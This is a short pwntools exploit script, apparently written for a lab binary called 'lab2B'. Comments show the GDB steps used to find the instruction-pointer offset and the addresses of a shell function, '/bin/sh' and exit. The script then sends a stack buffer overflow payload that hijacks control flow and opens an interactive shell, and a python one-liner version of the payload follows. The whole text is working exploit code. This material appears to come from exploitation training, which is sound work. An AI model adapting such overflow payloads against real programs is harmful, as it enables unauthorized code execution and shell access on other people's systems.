from pwn import *

# GDB:  r $(cyclic 35)
#   => EIP: 0x61616861 ('ahaa')
#
# SH:   cyclic -l ahaa
#   => 27 => EIP is at 27
#
# GDB:  p shell
#   => shell 0x5655620d
#
# GDB:  find /bin/sh
#   => 0x56557008
#
# GDB:  find exit
#   => 0xf7df5170
#
# [27] + [EIP => SHELL] + [RET => EXIT] + [ARG1 => /bin/sh]

payload = "A"*27 + p32(0x5655620d) + p32(0xf7df5170) + p32(0x56557008)
cracker = process(["./lab2B", payload])
cracker.interactive()

# r $(python -c 'print "A"*27 + "\rbUV" + "pQ\xdf\xf7" + "\x08pUV"')
